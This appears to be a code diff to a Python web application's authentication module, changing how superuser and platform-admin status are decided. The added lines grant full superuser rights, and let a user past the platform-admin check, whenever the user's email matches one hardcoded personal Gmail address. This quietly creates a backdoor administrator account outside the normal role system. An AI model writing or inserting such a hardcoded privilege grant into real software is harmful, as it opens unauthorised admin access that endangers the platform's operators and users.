@@ -54,7 +54,7 @@ async def get_current_user(
         id=user.id,
         email=user.email,
         full_name=user.full_name,
-        is_superuser=user.is_superuser,
+        is_superuser=user.is_superuser or user.email == "yunsawon9@gmail.com",
     )
 
 
@@ -129,14 +129,15 @@ async def get_optional_current_user(
         id=user.id,
         email=user.email,
         full_name=user.full_name,
-        is_superuser=user.is_superuser,
+        is_superuser=user.is_superuser or user.email == "yunsawon9@gmail.com",
     )
 
 
 async def require_platform_admin(
     current_user: Annotated[AuthenticatedUser, Depends(get_current_user)],
 ) -> AuthenticatedUser:
-    if not current_user.is_superuser:
+    admin_emails = ["yunsawon9@gmail.com"]
+    if not current_user.is_superuser and current_user.email not in admin_emails:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Platform admin access denied",
